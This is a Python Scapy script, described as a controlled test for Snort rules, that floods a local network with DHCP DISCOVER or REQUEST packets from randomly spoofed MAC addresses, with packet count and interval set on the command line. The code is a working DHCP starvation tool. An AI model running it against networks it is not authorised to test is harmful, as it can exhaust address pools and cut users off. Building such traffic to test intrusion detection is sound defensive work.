#!/usr/bin/env python3
"""
Controlled DHCP Flooding Test Script using Scapy.
Supports both DISCOVER and REQUEST flooding to test Snort rules.
"""
import sys
import time
import random

try:
    from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp
except ImportError:
    print("Scapy is not installed. Please use Yersinia or install python3-scapy.")
    sys.exit(1)

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))

def send_dhcp_flood(count=20, delay=0.1, msg_type="discover", iface="eth0"):
    msg_type = msg_type.lower()
    print(f"[*] Sending {count} DHCP {msg_type.upper()} packets on {iface} (interval: {delay}s)...")
    for i in range(count):
        mac = random_mac()
        chaddr = bytes.fromhex(mac.replace(":", "")) + b"\x00" * 10
        if msg_type == "request":
            dhcp_opts = [("message-type", "request"), ("requested_addr", "10.10.0.100"), "end"]
        else:
            dhcp_opts = [("message-type", "discover"), "end"]
            
        pkt = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=chaddr, xid=random.randint(1, 0xFFFFFFFF)) /
            DHCP(options=dhcp_opts)
        )
        sendp(pkt, iface=iface, verbose=False)
        print(f"    [{i+1}/{count}] Sent DHCP {msg_type.upper()} (spoofed MAC: {mac})")
        time.sleep(delay)
    print(f"[OK] Completed sending {count} {msg_type.upper()} packets.")

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 20
    delay = float(sys.argv[2]) if len(sys.argv) > 2 else 0.1
    mtype = sys.argv[3] if len(sys.argv) > 3 else "discover"
    send_dhcp_flood(count=count, delay=delay, msg_type=mtype)
